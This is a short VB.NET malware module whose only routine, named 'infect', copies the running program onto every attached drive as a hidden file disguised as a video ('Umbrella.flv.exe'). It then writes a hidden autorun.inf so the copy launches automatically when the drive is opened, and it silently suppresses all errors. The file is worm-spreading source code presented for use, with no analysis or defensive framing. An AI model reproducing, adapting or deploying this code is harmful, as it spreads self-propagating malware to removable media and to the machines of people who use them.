Imports System.IO
Module Usb1
    Public Sub infect()

        Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (IO.Directory.GetLogicalDrives)
        For Each usbs In driver
            Try
                IO.File.Copy(Application.ExecutablePath, usbs & "Umbrella.flv.exe")
                Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & usbs & "Umbrella.flv.exe")
                AutoStart.WriteLine("shellexecute=" & usbs, 1)
                AutoStart.Close()
                System.IO.File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                System.IO.File.SetAttributes(usbs & "Umbrella.flv.exe", FileAttributes.Hidden)
            Catch ex As Exception

            End Try
        Next

    End Sub
End Module
